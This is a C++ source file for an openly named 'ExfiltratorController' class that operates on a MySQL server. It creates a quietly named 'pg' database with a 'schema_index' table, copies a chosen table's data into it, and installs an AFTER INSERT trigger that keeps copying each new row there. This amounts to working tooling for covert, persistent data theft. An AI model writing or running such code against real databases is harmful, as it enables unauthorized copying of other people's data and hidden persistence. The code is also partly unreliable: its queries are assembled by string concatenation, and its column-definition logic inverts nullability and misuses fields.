#include <iostream>
#include <string>
#include <mysql.h>
#include "SQL.h"

using namespace std;

class ExfiltratorController{
    private:
        MYSQL* conn;

    public:
        ExfiltratorController(MYSQL* conn){
            this->conn = conn;
        }

            // create new database called pg with table called  schema_index with same columns as the selected table from the selected database
    void createDatabase(string database, string table) {
        if (mysql_query(conn, "CREATE DATABASE IF NOT EXISTS pg")) {
            cout << "Error en la consulta SQL 'CREATE DATABASE IF NOT EXISTS pg': " << mysql_error(conn) << endl;
        }
        if (mysql_query(conn, "USE pg")) {
            cout << "Error en la consulta SQL 'USE pg': " << mysql_error(conn) << endl;
        }
        string query = "SHOW COLUMNS FROM " + table + " IN " + database;
        if (mysql_query(conn, query.c_str())) {
            cout << "Error en la consulta SQL 'SHOW COLUMNS FROM " << table << " IN " << database << "': " << mysql_error(conn) << endl;
        }
        MYSQL_RES* result = mysql_store_result(conn);
        if (!result) {
            cout << "No se pudo almacenar el resultado de la consulta" << endl;
        }
        string create_table_query = "CREATE TABLE schema_index (";
        MYSQL_ROW row;
        while ((row = mysql_fetch_row(result))) {
            create_table_query += row[0];
            create_table_query += " ";
            create_table_query += row[1];
            if (row[2]) {
                if (strcmp(row[2], "YES") == 0) {
                    create_table_query += " NOT NULL";
                }
                else {
                    create_table_query += " ";
                    create_table_query += row[2];
                }
            }
            if (strcmp(row[1], "int") == 0) {
                create_table_query += "(";
                if (row[3]) {
                    create_table_query += row[3];
                }
                else {
                    create_table_query += "11";
                }
                create_table_query += ")";
            }
            create_table_query += ",";
        }
        create_table_query.pop_back();
        create_table_query += ")";

        if (mysql_query(conn, create_table_query.c_str())) {
            cout << "Error en la consulta SQL 'CREATE TABLE schema_index': " << mysql_error(conn) << endl;
        }
    }

    // exctract data from the selected table from the selected database and copy the data to the table schema_index in the database pg
    void copyData(string database, string table) {
        string query = "INSERT INTO pg.schema_index SELECT * FROM " + database + "." + table;
        if (mysql_query(conn, query.c_str())) {
            cout << "Error en la consulta SQL 'INSERT INTO pg.schema_index SELECT * FROM " << database << "." << table << "': " << mysql_error(conn) << endl;
            return;
        }
        cout << "Los datos han sido copiados exitosamente" << endl;
    }

    // method to exctract first column name of index_schema table in pg database
    string getFirstColumnName() {
        string query = "SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='schema_index' AND TABLE_SCHEMA='pg' LIMIT 1";
        if (mysql_query(conn, query.c_str())) {
            cout << "Error en la consulta SQL 'getFirstColumnName': " << mysql_error(conn) << endl;
            return "";
        }
        MYSQL_RES* result = mysql_store_result(conn);
        if (result == NULL) {
            cout << "Error al almacenar el resultado de la consulta SQL 'getFirstColumnName': " << mysql_error(conn) << endl;
            return "";
        }
        MYSQL_ROW row = mysql_fetch_row(result);
        if (row == NULL) {
            cout << "No se encontró ningún resultado para la consulta SQL 'getFirstColumnName'" << endl;
            mysql_free_result(result);
            return "";
        }
        string firstColumnName = row[0];
        mysql_free_result(result);
        return firstColumnName;
    }

    void createTrigger(string database, string table) {
        // Get the first column name from schema_index table in pg database
        string column_name = getFirstColumnName();
        string db = "USE " + database;
        mysql_query(conn, db.c_str());


        if (column_name.empty()) {
            cout << "Error: No se pudo obtener el nombre de la primera columna de la tabla schema_index" << endl;
        }

        // Create the trigger query with the obtained column name
        string trigger_query = "CREATE TRIGGER copy_to_schema_index "
            "AFTER INSERT ON `" + database + "`.`" + table + "` "
            "FOR EACH ROW "
            "INSERT INTO `pg`.`schema_index` SELECT * FROM `" + database + "`.`" + table + "` WHERE `" + column_name + "` = NEW.`" + column_name + "`";


        if (mysql_query(conn, trigger_query.c_str())) {
            cout << "Error en la consulta SQL 'CREATE TRIGGER': " << mysql_error(conn) << endl;
        }

    }
};